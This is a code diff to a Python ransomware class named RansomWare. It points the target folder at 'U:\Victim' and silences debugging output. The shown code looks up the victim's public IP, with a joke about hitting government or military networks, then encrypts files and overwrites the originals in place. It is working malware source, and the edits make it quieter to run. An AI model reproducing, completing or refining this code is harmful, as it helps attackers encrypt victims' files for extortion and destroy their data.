@@ -46,7 +46,7 @@ class RansomWare:
         # Use sysroot to create absolute path for files, etc. And for encrypting whole system
         self.sysRoot = os.path.expanduser('~')
         # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
-        self.localRoot = r'D:\Coding\Python\RansomWare\RansomWare_Software\localRoot' # Debugging/Testing
+        self.localRoot = r'U:\Victim' # Debugging/Testing
 
         # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
         self.publicIP = requests.get('https://api.ipify.org').text
@@ -97,18 +97,18 @@ class RansomWare:
             data = f.read()
             if not encrypted:
                 # Print file contents - [debugging]
-                print(data)
+                # print(data)
                 # Encrypt data from file
                 _data = self.crypter.encrypt(data)
                 # Log file encrypted and print encrypted contents - [debugging]
-                print('> File encrpyted')
-                print(_data)
+                # print('> File encrpyted')
+                # print(_data)
             else:
                 # Decrypt data from file
                 _data = self.crypter.decrypt(data)
                 # Log file decrypted and print decrypted contents - [debugging]
-                print('> File decrpyted')
-                print(_data)
+                # print('> File decrpyted')
+                # print(_data)
         with open(file_path, 'wb') as fp:
             # Write encrypted/decrypted data to file using same filename to overwrite original file
             fp.write(_data)
